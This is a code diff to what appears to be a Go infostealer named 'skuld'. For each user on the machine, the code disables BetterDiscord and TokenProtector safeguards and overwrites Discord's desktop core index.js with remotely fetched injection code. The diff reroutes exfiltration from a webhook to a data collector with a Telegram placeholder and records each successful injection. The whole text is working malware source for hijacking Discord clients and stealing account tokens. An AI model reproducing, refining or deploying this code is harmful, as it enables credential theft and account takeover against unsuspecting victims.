@@ -15,10 +15,11 @@ import (
 	"encoding/json"
 
 	"github.com/hackirby/skuld/utils/hardware"
+	"github.com/hackirby/skuld/utils/collector"
 	"github.com/shirou/gopsutil/v3/process"
 )
 
-func Run(injection_url string, webhook string) {
+func Run(injection_url string, dataCollector *collector.DataCollector) {
 	for _, user := range hardware.GetUsers() {
 		BypassBetterDiscord(user)
 		BypassTokenProtector(user)
@@ -28,12 +29,12 @@ func Run(injection_url string, webhook string) {
 			filepath.Join(user, "AppData", "Local", "discordptb"),
 			filepath.Join(user, "AppData", "Local", "discorddevelopment"),
 		} {
-			InjectDiscord(dir, injection_url, webhook)
+			InjectDiscord(dir, injection_url, dataCollector)
 		}
 	}
 }
 
-func InjectDiscord(dir string, injection_url string, webhook string) error {
+func InjectDiscord(dir string, injection_url string, dataCollector *collector.DataCollector) error {
 	files, err := filepath.Glob(filepath.Join(dir, "app-*", "modules", "discord_desktop_core-*", "discord_desktop_core"))
 	if err != nil {
 		return err
@@ -61,12 +62,20 @@ func InjectDiscord(dir string, injection_url string, webhook string) error {
 		return errors.New("core.asar not in body")
 	}
 
-	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte(webhook), 1)
+	// For injection, we'll use a placeholder since we're not using webhooks anymore
+	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte("TELEGRAM_PLACEHOLDER"), 1)
 
 	err = os.WriteFile(filepath.Join(core, "index.js"), body, 0644)
 	if err != nil {
 		return err
 	}
+
+	// Log injection success
+	injectionInfo := map[string]interface{}{
+		"Status":     "Discord injection completed",
+		"TargetPath": core,
+	}
+	dataCollector.AddData("discord_injection", injectionInfo)
 
 	return nil
 }
